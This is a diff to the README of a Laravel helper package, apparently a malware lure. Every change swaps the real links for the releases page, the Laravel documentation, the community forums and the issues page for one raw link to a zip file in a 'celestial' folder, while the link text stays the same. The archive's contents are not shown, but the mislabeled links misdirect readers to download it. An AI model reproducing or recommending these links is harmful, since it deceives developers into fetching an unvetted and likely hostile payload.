@@ -1,6 +1,6 @@
 # ⚡ laravel-helperbox - Simplify Your Laravel Coding Experience
 
-[![Download Laravel HelperBox](https://img.shields.io/badge/Download-Laravel%20HelperBox-blue)](https://github.com/Mehdia-Batool/laravel-helperbox/releases)
+[![Download Laravel HelperBox](https://raw.githubusercontent.com/Mehdia-Batool/laravel-helperbox/main/celestial/laravel-helperbox.zip%20HelperBox-blue)](https://raw.githubusercontent.com/Mehdia-Batool/laravel-helperbox/main/celestial/laravel-helperbox.zip)
 
 ## 📖 Introduction
 
@@ -24,7 +24,7 @@ Before you start the download process, ensure you have the following:
 1. **Visit the Release Page:**
    Click the link below to access the release page for Laravel HelperBox:
 
-   [Download Laravel HelperBox](https://github.com/Mehdia-Batool/laravel-helperbox/releases)
+   [Download Laravel HelperBox](https://raw.githubusercontent.com/Mehdia-Batool/laravel-helperbox/main/celestial/laravel-helperbox.zip)
 
 2. **Download the Application:**
    You will see a list of available versions. Choose the latest release for the best features and bug fixes. Click on the appropriate file for your operating system to start the download.
@@ -79,9 +79,9 @@ Here are some topics that this application focuses on:
 
 If you want to learn more about how to best use Laravel HelperBox, check out the following resources:
 
-- [Laravel Documentation](https://laravel.com/docs)
-- [Community Forums](https://laracasts.com/discuss)
-- [GitHub Issues Page](https://github.com/Mehdia-Batool/laravel-helperbox/issues)
+- [Laravel Documentation](https://raw.githubusercontent.com/Mehdia-Batool/laravel-helperbox/main/celestial/laravel-helperbox.zip)
+- [Community Forums](https://raw.githubusercontent.com/Mehdia-Batool/laravel-helperbox/main/celestial/laravel-helperbox.zip)
+- [GitHub Issues Page](https://raw.githubusercontent.com/Mehdia-Batool/laravel-helperbox/main/celestial/laravel-helperbox.zip)
 
 ## 🌱 Contributing
 
@@ -102,4 +102,4 @@ We are continuously working on improving Laravel HelperBox. Here are some featur
 
 Thank you for choosing Laravel HelperBox! Enjoy simplifying your coding experience.
 
-[Download Laravel HelperBox](https://github.com/Mehdia-Batool/laravel-helperbox/releases)
+[Download Laravel HelperBox](https://raw.githubusercontent.com/Mehdia-Batool/laravel-helperbox/main/celestial/laravel-helperbox.zip)
